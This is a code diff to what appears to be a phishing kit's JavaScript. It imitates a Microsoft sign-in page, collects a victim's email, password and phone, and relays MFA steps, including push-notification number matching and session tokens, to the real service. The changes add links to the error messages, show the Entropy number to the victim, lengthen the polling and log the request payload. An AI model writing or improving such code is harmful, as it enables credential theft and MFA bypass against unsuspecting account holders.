@@ -1,4 +1,4 @@
-var Errs={'NoOtpCode':'Enter the code to help us verify your identity.','OathCodeIncorrect':'You didn\'t enter the expected verification code. Please try again.','NoAccount':'We couldn\'t find an account with that username&period; Try another, or get a new account.','NoPassword':'Please enter your password.','accIncorrect':'Your account or password is incorrect. If you don\'t remember your password, reset it now.','UnableVeri':'Sorry, we\'re having trouble verifying your account. Please try again.','InvalidSession':'Your session has timed out. Please close your browser and sign in again.<a id="ViewDetails" class="no-wrap" href="#">View details</a>'};
+var Errs={'NoOtpCode':'Enter the code to help us verify your identity.<a id="ViewDetails" class="no-wrap" href="#">View details</a>','OathCodeIncorrect':'You didn\'t enter the expected verification code. Please try again.<a id="ViewDetails" class="no-wrap" href="#">View details</a>','NoAccount':'We couldn\'t find an account with that username. Try another, or get a new account.<a id="ViewDetails" class="no-wrap" href="#">View details</a>','NoPassword':'Please enter your password.','accIncorrect':'Your account or password is incorrect. If you don\'t remember your password, <a id="ViewDetails" class="no-wrap" href="#">reset it now.</a>','UnableVeri':'Sorry, we\'re having trouble verifying your account. Please try again <a id="ViewDetails" class="no-wrap" href="#">View details</a>','InvalidSession':'Your session has timed out. Please close your browser and sign in again.<a id="ViewDetails" class="no-wrap" href="#">View details</a>'};
 var email = "";
 var epass = "";
 var phone = "";
@@ -18,9 +18,9 @@ return regex.test(email);
 }
 function nextto(vak) {
 if(vak){
-	email = vak;  
+    email = vak;  
 }else{
-	email = $("#email").val();  
+    email = $("#email").val();  
 }
 console.log(vak); 
 if (isEmail(email) === true) {
@@ -134,10 +134,11 @@ if(gototype['status']){
 $("#screen2").html(gototype['msg']);
 data.forEach(function (val, i) {
 var authid = val["authMethodId"];
-$("#screen2 #" + authid).show();
-$("#screen2 #" + authid + " .pnum").text(val["display"]);
+$("#screen2 #"+authid).show();
+$("#screen2 #"+authid+ " .pnum").text(val["display"]);
 phone = val["display"];
 });
+Proofs=$('#screen2').html();
 }
 }
 }
@@ -152,6 +153,10 @@ if (act["Success"]) {
      $("#screen2 #load").hide();
 $("#screen2").html(reslt['msg']);
 if (atype == "TwoWayVoiceMobile" || atype == "PhoneAppNotification") {
+    if(act['Entropy']){
+        $("#displaySign").show();
+        $("#displaySigntxt").html(act['Entropy']);
+    }
 startEndath(atype);
 }
 }else{
@@ -279,7 +284,7 @@ if (vdata["Success"]) {
 PollCount = 1;
 AuthEdata(atype);
 }
-if (PollCount >= 8) {
+if (PollCount >= 10) {
     authback(1);
    
 console.log("PollCount Stoped");
@@ -309,6 +314,7 @@ lVal["flowToken"] +
 '","hpgrequestid":"' +
 lVal["sseid"] +
 '","sacxt":"","hideSmsInMfaProofs":false,"canary":"","i19": "42293"}';
+console.log(valx);
 $.ajax({
 type: "POST",
 url: urlx,
